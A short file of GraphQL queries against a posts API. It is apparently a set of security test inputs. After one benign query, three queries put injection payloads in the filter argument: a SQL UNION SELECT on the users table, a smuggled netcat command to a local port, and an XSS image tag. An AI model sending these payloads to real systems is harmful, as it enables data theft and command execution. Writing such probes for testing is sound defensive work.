query.query:
query {
  posts {
    data {
      id
      title
      user {
        name
      }
    }
  }
}

query {
  posts(options: {filter: "id: '1' UNION SELECT * FROM users--"}) {
    data {
      id
      title
    }
  }
}

query {
  posts(options: {filter: "id: '1; nc 127.0.0.1 1337'", limit: 10}) {
    data {
      id
    }
  }
}

query {
  posts(options: {filter: "title: '<img src=x onerror=alert(1)>'"}) {
    data {
      title
    }
  }
}

